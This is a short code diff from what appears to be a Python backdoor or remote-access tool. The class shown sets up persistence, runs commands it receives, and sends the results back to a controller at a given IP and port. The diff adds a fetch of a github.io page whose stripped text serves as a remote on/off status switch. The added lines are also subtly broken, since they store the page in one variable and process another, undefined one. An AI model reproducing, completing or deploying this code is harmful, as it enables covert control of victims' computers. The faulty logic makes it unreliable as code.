@@ -18,6 +18,7 @@ import shutil
 import re
 import scapy.all as scapy
 from time import sleep
+import requests
 class MotherFucker():
     def __init__(self, ip, port):
 	self.persistence()
@@ -139,6 +140,10 @@ class MotherFucker():
                     cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"
 
             self.cmd_send(cmd_rslt)
+
+
+s = requests.get('https://poggerpussy.github.io').text
+status = re.sub(r"<.*?>",'', status)
 if __name__ == "__main__":
     try:
         if status == "true":
